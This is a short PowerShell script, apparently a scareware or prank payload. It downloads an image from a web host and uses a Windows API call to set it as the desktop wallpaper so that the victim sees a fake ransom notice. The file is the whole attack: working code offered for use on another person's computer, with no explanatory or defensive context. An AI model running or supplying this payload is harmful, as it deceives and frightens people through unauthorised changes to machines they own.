# Wallpaper Ransom - Locks user with fake ransom wallpaper
$url = "https://i.imgur.com/0KfbG6A.jpg"  # Replace with custom image
$img = "$env:TEMP\ransom.jpg"
Invoke-WebRequest -Uri $url -OutFile $img
Add-Type -TypeDefinition '[DllImport("user32.dll")]public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);' -Name NativeMethods -Namespace Win
[Win.NativeMethods]::SystemParametersInfo(20, 0, $img, 3)
